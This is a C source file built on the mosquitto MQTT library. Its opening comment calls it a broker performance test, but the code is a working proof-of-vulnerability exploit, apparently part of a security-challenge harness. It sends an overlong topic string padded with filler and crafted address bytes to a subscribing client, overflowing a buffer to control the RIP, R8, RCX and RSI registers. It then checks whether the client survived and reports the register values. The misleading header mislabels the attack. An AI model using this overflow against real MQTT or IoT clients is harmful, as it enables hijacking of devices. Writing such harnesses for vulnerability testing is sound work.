/* This provides a crude manner of testing the performance of a broker in messages/s. */
#include "config.h"

#include <stdbool.h>
#include <assert.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <mosquitto.h>
#include <mqtt_protocol.h>
#include <stdatomic.h>
#include <string.h>
#include <inttypes.h>

#define PUB_QOS 1
#define SUB_QOS 1

char* HOST = "127.0.0.1";
int PORT = 1883;
int LENGTH = 40;
int TIMEOUT = 60;
char* SEED = "1";
bool success = false;
static atomic_int message_count = 0;
int return_val = 0;

/* Callback called when the client receives a CONNACK message from the broker. */
void on_connect(struct mosquitto *mosq, void *obj, int reason_code)
{
	int rc;
	/* Print out the connection result. mosquitto_connack_string() produces an
	 * appropriate string for MQTT v3.x clients, the equivalent for MQTT v5.0
	 * clients is mosquitto_reason_string().
	 */
	fprintf(stderr,"on_connect: %s\n", mosquitto_connack_string(reason_code));
	if(reason_code != 0){
		/* If the connection fails for any reason, we don't want to keep on
		 * retrying in this example, so disconnect. Without this, the client
		 * will attempt to reconnect. */
		fprintf(stderr, "Error on connect\n");
		mosquitto_disconnect(mosq);
	}

	/* Making subscriptions in the on_connect() callback means that if the
	 * connection drops and is automatically resumed by the client, then the
	 * subscriptions will be recreated when the client reconnects. */
	rc = mosquitto_subscribe(mosq, NULL, "app/#", 1);
	if(rc != MOSQ_ERR_SUCCESS){
		fprintf(stderr, "Error subscribing: %s\n", mosquitto_strerror(rc));
		/* We might as well disconnect if we were unable to subscribe */
		mosquitto_disconnect(mosq);
	}

}
void on_log(struct mosquitto *mosq, void *obj, int level, const char *str)
{
	UNUSED(mosq);
	UNUSED(obj);
	UNUSED(level);
	fprintf(stderr,"%s\n", str);
}

void on_message(struct mosquitto *mosq, void *obj, const struct mosquitto_message *msg)
{
	if(strcmp(msg->topic, "app/request")){
		fprintf(stderr,"received message on '%s'\n", msg->topic);
		fprintf(stderr,"message payload: %s\n\n", msg->payload);
	}
	/* if it doesn't equal app/error or app/request then it should contain the client id */
	if(!strcmp(msg->topic, "app/respond")){
		char* client_id = strtok(msg->payload, " ");
		fprintf(stderr,"client id: %s\n\n", client_id);

		mosquitto_reinitialise(mosq, client_id, true, NULL);
		int rc = mosquitto_connect(mosq, HOST, PORT, 60);
		if(rc){
			fprintf(stderr,"Error Connecting rc = %d\n", rc);
		}
		// Client is responding so set success to true for when the exploit succeeds
		success = true;

	}else if(!strcmp(msg->topic, "app/test/success")){
		success = false;
	}

}

void on_publish_callback(struct mosquitto *mosq, void *obj, int mid)
{
	message_count++;
}

int main(int argc, char *argv[])
{
	struct mosquitto *mosq = NULL;
	int rc;
	char character = 'A';
	char* request_topic = "app/request";
	char* string_topic = malloc(9000);
	char* register_rcx_rsi = "\xC0\x3e\xe0\x3e\x55\x72\x64\x28";
	// This can only be 6 bytes with a leading 7 or less due to it being called as an address
	char* register_rip_r8 = "\x55\x43\x67\xa9\xb2\x70";
	// These are for printing out at the end (the string had problems printing out hex values)
	uint64_t register_rcx_rsi_hex = 0x286472553ee03ec0;
 	uint64_t register_rip_r8_hex = 0x000070b2a9674355;

	// Get all environment variables
	if(getenv("HOST")){
		HOST = getenv("HOST");
	}else {
		HOST = "127.0.0.1";
	}
	if(getenv("PORT")){
		PORT = atoi(getenv("PORT"));
	}else {
		PORT = 1883;
	}
	if(getenv("TIMEOUT")){
		TIMEOUT = atoi(getenv("TIMEOUT"));
	} else {
		TIMEOUT = 90;
	}
	if(getenv("LENGTH")){
		LENGTH = atoi(getenv("LENGTH"));
	}else {
		LENGTH = 40;
	}
	if(getenv("SEED")){
		SEED = getenv("SEED");
	} else {
		SEED = "1";
	}

	fprintf(stdout,"HOST: %s\n", HOST);
	fprintf(stdout,"PORT: %i\n", PORT);
	fprintf(stdout,"TIMEOUT: %i\n", TIMEOUT);
	fprintf(stdout,"LENGTH: %i\n", LENGTH);

	strcpy(string_topic, "UV app/");
	int i;

	// The topic length just needs to be sighty greater than 500
	for(i = strlen("UV app/"); i <= 484; i++){
		strncpy(string_topic + i, &character, 1);
	}

	strcat(string_topic, register_rcx_rsi);
	strcat(string_topic, register_rip_r8);

	mosquitto_lib_init();

	char *client_pov_id = "pov";
	mosq = mosquitto_new(client_pov_id, false, NULL);
	if(mosq == NULL){
		fprintf(stderr, "Error: Out of memory.\n");
		return 1;
	}
	if(!mosq){
		switch(errno){
			case ENOMEM:
				fprintf(stderr,"Error: Out of memory.\n");
				break;
			case EINVAL:
				fprintf(stderr,"Error: Invalid id and/or clean_session.\n");
				break;
		}
		return_val = 1;
		goto cleanup;
	}

	mosquitto_publish_callback_set(mosq, on_publish_callback);
	mosquitto_connect_callback_set(mosq, on_connect);
	mosquitto_message_callback_set(mosq, on_message);
	mosquitto_loop_start(mosq);

	rc = mosquitto_connect(mosq, HOST, PORT, 60);
	if(rc){
		return_val = 1;
		goto cleanup;
	}

	// connection to broker was successfull so set timeout
	if(TIMEOUT > 0){
		alarm(TIMEOUT);
	}

	// wait for connection to be established
	sleep(LENGTH/10);

	fprintf(stderr,"publishing to %s\n", request_topic);
	fprintf(stderr,"payload: %s\n\n", string_topic);

	rc = mosquitto_publish(mosq, NULL, request_topic, strlen(string_topic), string_topic, PUB_QOS, 0);
	if(rc){
		fprintf(stderr,"Error Publishing rc = %i\n", rc);
		return_val = 1;
		goto cleanup;
	}

	/* Publish to app/request with the temperature command and set app/respond as the topic to send the response on */
    string_topic = "temperature app/respond";

	rc = mosquitto_publish(mosq, NULL, request_topic, strlen(string_topic), string_topic, PUB_QOS, 0);
	if(rc){
		fprintf(stderr,"Error Publishing rc = %i\n", rc);
		return_val = 1;
		goto cleanup;
	}

	sleep(LENGTH/2);

	// Open up Thermometer-1 name so the client can reconnect if the exploit didn't succeed
	mosquitto_loop_stop(mosq, true);
	mosquitto_reinitialise(mosq, client_pov_id, true, NULL);
	rc = mosquitto_connect(mosq, HOST, PORT, 60);
	if(rc){
		fprintf(stderr,"Error Connecting rc = %d\n", rc);
	}

	mosquitto_publish_callback_set(mosq, on_publish_callback);
	mosquitto_connect_callback_set(mosq, on_connect);
	mosquitto_message_callback_set(mosq, on_message);
	mosquitto_loop_start(mosq);

	sleep(LENGTH/5);

	/* Publish to app/request with the temperature command and set app/respond as the topic to send the response on */
  string_topic = "temperature app/test/success";
	fprintf(stderr,"Testing to see if client is still alive\n\n");

	rc = mosquitto_publish(mosq, NULL, request_topic, strlen(string_topic), string_topic, PUB_QOS, 0);
	if(rc){
		fprintf(stderr,"Error Publishing rc = %i\n", rc);
		return_val = 1;
		goto cleanup;
	}

	sleep(LENGTH/5);

cleanup:
	mosquitto_loop_stop(mosq, true);
	if(success){
		fprintf(stdout,"REGISTER_RIP=0000%" PRIx64 "\n", register_rip_r8_hex);
		fprintf(stdout,"REGISTER_R8=0000%" PRIx64 "\n", register_rip_r8_hex);
		fprintf(stdout,"REGISTER_RCX=%" PRIx64 "\n", register_rcx_rsi_hex);
		fprintf(stdout,"REGISTER_RSI=%" PRIx64 "\n", register_rcx_rsi_hex);
		fprintf(stdout,"SUCCESS\n");
	}else{
		fprintf(stdout,"FAILURE\n");
		return_val = 1;
	}
	sleep(LENGTH/5);
	mosquitto_disconnect(mosq);
	mosquitto_destroy(mosq);
	mosquitto_lib_cleanup();
	return return_val;
}
